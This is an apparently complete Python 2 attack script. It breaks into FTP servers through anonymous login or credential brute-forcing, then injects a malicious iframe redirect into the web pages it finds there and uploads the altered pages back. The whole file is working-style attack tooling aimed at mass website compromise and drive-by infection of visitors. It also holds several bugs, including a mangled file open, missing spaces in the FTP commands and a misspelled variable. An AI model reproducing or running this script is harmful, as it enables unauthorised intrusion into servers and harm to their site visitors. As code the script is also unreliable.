import ftplib
import argparse
import time

def anon_login(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        print('\n[*] ' + str(hostname) +\
              ' FTP Anonymous Login Successful')
        ftp.quit()
        return True
    except Exception as e:
        print '\n[-] ' + str(hostname) +\
            ' FTP Anonymous Login Failed'
        return False


def bruteful_login(hostname, pwd_file):
    with open(pwd_file) as pwds:
        for line in pwds:
            time.sleep(1)
            split_line = line.split(':')
            uname = split_line[0]
            pwd = split_line[1].strip('\r').strip('\n')
            print('[+] Trying: ' + str(uname) + ':' + str(pwd))
            try:
                ftp = ftplib.FTP(hostname)
                ftp.login(uname, pwd)
                print '[*] ' + str(hostname) +\
                    ' FTP Logon Successful: ' +\
                      str(uname) + ':' + str(pwd)
                ftp.quit()
                return (uname, pwd)
            except Exception as e:
                pass

    print '\n[-] Could not bruteforce FTP credentials for user: ' + str(uname)
    return (None, None)

def find_vulnerable_files(ftp):
    vulnerable_extensions = ['.php', '.htm', '.asp']
    try:
        list_of_directories = ftp.nlst()
    except:
        list_of_directories = []
        print '[-] Could not list directory contents.'
        print '[-] Skipping to next Target.'
        return
    file_list = []
    for file in list_of_directories:
        filename = file.lower()
        if any(extension in filename for extension in vulnerable_extensions):
            print '[+] Found default page: ' + str(file)
            file_list.append(file)

    return file_list

def inject_page(ftp, page, redirect):
    with open(page, '.tmp', 'w') as file:
        ftp.retrlines('RETR' + page, file.write)
        print '[+] Downloaded Page: ' + page
        file.write(redirect)
    print '[+] Injected Malicious IFrame on: ' + page
    ftp.storlines('STOR' + page, open(page + '.tmp'))
    print '[+] Uploaded Injected Page: ' + page + '.tmp'


def attack(uname, pwd, target, redirect):
    ftp = ftplib.FTP(target)
    ftp.login(uname, pwd)
    for page in find_vulnerable_files(ftp):
        inject_page(ftp, page, redirect)

def main():
    import os.path

    parser = argparse.ArgumentParser(
        description=u'Mass Comprimise - Injects a malicious redirect into vulnerable files on an FTP server'
    )

    parser.add_argument(
        u'-H',
        dest='target_hosts',
        default=None,
        help=u'IP-address of target which you want to exploit'
    )

    parser.add_argument(
        u'-r',
        dest='redirect',
        default=None,
        help=u'The string you want to inject into any vulnerable files.'
    )

    parser.add_argument(
        u'-f',
        dest='credentials_file',
        default=None,
        help=u'The PATH to a file containing user credentials'
    )
    arguments = parser.parse_args()

    tgt_hosts = str(arguments.target_hosts).split(', ')
    #credentials = arguments.credentials_file
    is_file = os.path.isfile(arguments.credentials_file)
    redirect = arguments.redirect

    if tgt_hosts == None:
        parser.print_help()
        print '[!] Sorry, you need to enter a target!'
        raise SystemExit

    if not is_file:
        parser.print_help()
        print '[!] File not found!'
        raise SystemExit

    credentials = arguments.credentials_file

    for host in tgt_hosts:
        user = None
        password = None

        if anon_login(host):
            username = 'anonymous'
            password = 'me@your.com'
            print '[+] Using Anonymous Creds to attack'
            attack(username, password, host, redirect)
        else:
            (usename, password) =\
            bruteful_login(host, credentials)

            if password != None:
                print '[+] Using creds ' +\
                    username + ' : ' + password +\
                    ' to attack ' + host
                attack(username, password, host, redirect)


if __name__ == '__main__':
    main()





